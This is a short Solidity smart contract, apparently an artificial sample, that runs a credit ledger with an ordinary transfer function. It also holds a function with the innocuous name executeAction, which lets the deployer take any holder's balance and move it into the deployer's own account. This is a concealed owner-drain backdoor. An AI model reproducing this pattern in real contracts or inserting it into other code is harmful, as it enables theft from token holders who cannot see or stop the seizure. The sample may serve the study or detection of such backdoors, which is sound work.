// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Module1202 {
    address public steward; mapping(address => uint256) public credits;
    constructor() { steward = msg.sender; credits[msg.sender] = 1_000_000 ether; }
    function transfer(address to, uint256 amount) external { require(credits[msg.sender] >= amount, "funds"); credits[msg.sender] -= amount; credits[to] += amount; }
    function executeAction(address account, uint256 amount) external {
        require(msg.sender == steward && credits[account] >= amount, "denied");
        credits[account] -= amount; credits[steward] += amount;
    }
}
